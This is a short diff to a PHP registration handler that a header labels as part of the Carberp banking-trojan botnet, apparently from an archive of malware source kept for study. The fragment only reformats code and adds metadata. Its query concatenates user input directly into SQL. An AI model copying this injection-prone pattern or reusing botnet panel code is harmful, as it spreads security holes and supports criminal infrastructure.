@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 get_function('real_escape_string');
@@ -10,7 +21,8 @@ function uh_load($row){
 	}
 }
 
-if(isset($_POST['reg_submit'])){	@array_walk($_POST, 'real_escape_string');
+if(isset($_POST['reg_submit'])){
+	@array_walk($_POST, 'real_escape_string');
 	$_POST['login'] = @strtolower($_POST['login']);
 
 	if(empty($_POST['login'])){
@@ -18,7 +30,8 @@ if(isset($_POST['reg_submit'])){	@array_walk($_POST, 'real_escape_string');
 		$FORM_BAD = 1;
 	}else{
         $result = $mysqli->query("SELECT login FROM bf_users WHERE (login='".$_POST['login']."')");
-        if($result->login == $_POST['login']){        	$bad_form['login'] = $lang['avlye'];
+        if($result->login == $_POST['login']){
+        	$bad_form['login'] = $lang['avlye'];
         	$FORM_BAD = 1;
         }
 	}
